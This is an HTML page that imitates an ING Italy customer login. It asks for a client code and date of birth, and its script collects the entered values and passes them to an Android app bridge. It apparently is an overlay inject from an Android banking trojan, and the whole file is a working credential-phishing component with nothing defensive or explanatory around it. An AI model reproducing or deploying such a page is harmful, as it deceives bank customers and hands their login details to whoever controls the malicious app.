<!DOCTYPE html>
<html>
<head>
    <title>ING</title>
    <meta charset="utf-8">
</head>
<body>

<style type="text/css">
    body {
    background: #ffffff;
    margin: 0;
    padding: 0;
    font-family: Helvetica, sans-serif;
    }
    .logo {
    background: #fafafa;
    text-align: left;
    box-shadow: -1px -2px 20px 0px #8b8b8b;
    }
    .form {
        text-align: center;
        padding-top: 70px;
    }
    .form label {
        display: block;
    }
    form {
        display: inline-block;
    }
fieldset {
      position: relative;
      text-align: center;
      border: none;
      margin-top: 40px;
}

input[type="text"] {
left: 0;
    right: 0;
    width: 80%;
    background: none;
    height: 30px;
    margin: 5px;
    padding-left: 10px;
    color: #151515;
    outline: none;
    border-bottom: 1.5px solid #767676;
    border-top: none;
    border-left: none;
    border-right: none;
    font-weight: 600;
    -webkit-appearance: none;
}
input[type="password"] {
left: 0;
    right: 0;
    width: 30%;
    background: none;
    height: 30px;
    margin: 5px;
    padding-left: 10px;
    color: #151515;
    outline: none;
    border-bottom: 1.5px solid #767676;
    border-top: none;
    border-left: none;
    border-right: none;
    font-weight: 600;
    -webkit-appearance: none;
}
input[type="text"]:focus,input[type="password"]:focus {
border-bottom: 1.5px solid #ff8535;
}
input[type="button"] {
left: 0;
    right: 0;
    width: 82%;
    height: 39px;
    margin: 5px;
    border-radius: 4px;
    color: #fff;
    outline: none;
    background: #fb6c0e;
    border: none;
    font-size: 15px;
    -webkit-appearance: none;
}
input::placeholder {
    color: #151515;
}
fieldset span {
    display: inline-block;
    width: 80%;
    text-align: left;
    color: #c5f8ff;
    left: 0;
    right: 0;
    padding-top: 30px;
}
    /* прячем стандартный чекбокс */
input[type="checkbox"] {
    display: none;
}

/* стили для метки */
input[type="checkbox"] + label {
    cursor: pointer;
    padding-left: 50px;
    position: relative;
    font-family: tahoma, sans-serif, arial;
    line-height: 40px;
}

/* стили для поля с бегунком*/
input[type="checkbox"] + label::before {
    content: "";
    display: inline-block;
    position: absolute;
    top: 0;
    left: 0;
    vertical-align: middle;
    padding: 0;
    height: 24px;
    width: 45px;
    margin: 0 5px 0 0;
    border: 1px solid #dadada;
    border-radius: 12px;
    background: #dddddd;
}

/* стили для бегунка*/
input[type="checkbox"] + label::after {
    content: "";
    display: block;
    position: absolute;
    top: 1px;
    left: 1px;
    width: 22px;
    height: 22px;
    border-radius: 22px;
    background: #fff;
    border: 1px solid #dadada;
    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
}

/* плавность )) */
input[type="checkbox"] + label::before,
input[type="checkbox"] + label::after {
    -webkit-transition: all .2s ease-out;
    transition: all .2s ease-out;
}

/* чекнутое состояние )) */
input[type="checkbox"]:checked + label::before {
    background: #6edc5f;
    border-color: #6dd75e;
}
input[type="checkbox"]:checked + label::after {
    left: 22px;
}
fieldset p {
        display: inline-block;
    text-align: left;
    left: 0;
    right: 0;
    border: 1px solid #6fcbd8;
    padding: 30px;
    border-radius: 50px;
    background: #6fcbd8;
}
#footer {
    position: relative;
}
#footer div {
    background: #fb6c0e;
    padding: 10px;
    color: #fff;
    border-bottom: 1px solid #d9d9d9;
}
</style>

<fieldset id="formtosend">
        <label style="display: block; color: #fff;">BENVENUTO</label>
        <input type="text" name="codicecliente" placeholder="Codice Cliente">
        <input type="password" placeholder="Giorno" name="giorno" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
        <input type="password" placeholder="Mese" name="mese" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
        <input type="password" style="    width: auto;" placeholder="Anno di nascita" name="annodinascita" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
        <input name="exit" type="hidden" text="true"/>
        <input type="button" name="sumbit" onclick="send_form()" value="Avanti">
</fieldset>

<br><br>
    <div id="footer">
        <div class="one">
                Scorpi la nuova funzionalità Token
        </div>
        <div class="two">
                Chiamaci
        </div>
        <div class="three">
                Scorpi i nostri Prodotti
        </div>
    </div>

<script>
if ( typeof Android == "undefined")
    var Android = {
        returnResult : alert.bind(window)
    }

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals.join(',') + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSONbyName(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            if(bsform[j].name == 'sumbit') continue;
            FinalObject[bsform[j].name] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}

function send_form()
{
    var form = document.getElementById('formtosend');
    Android.returnResult( formToJSONbyName(form) );
}
</script>
